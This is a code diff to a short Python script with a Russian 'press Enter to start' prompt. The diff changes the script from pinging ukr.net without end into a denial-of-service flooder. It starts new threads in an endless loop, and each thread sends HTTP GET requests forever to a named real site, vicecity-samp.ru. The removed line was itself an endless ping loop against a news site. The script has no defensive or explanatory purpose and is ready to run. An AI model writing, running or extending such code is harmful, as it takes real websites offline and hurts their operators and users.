@@ -1,3 +1,6 @@
+# coding: utf8
+import threading
+import requests
 import os
 print("""
 
@@ -11,5 +14,10 @@ print("""
 
 """)
 input("Нажмите на Enter чтобы начать!")
+
+def dos():
+ while True:
+  requests.get("https://vicecity-samp.ru")
+  
 while True:
-	os.system("ping ukr.net")
+ threading.Thread(target=dos).start()
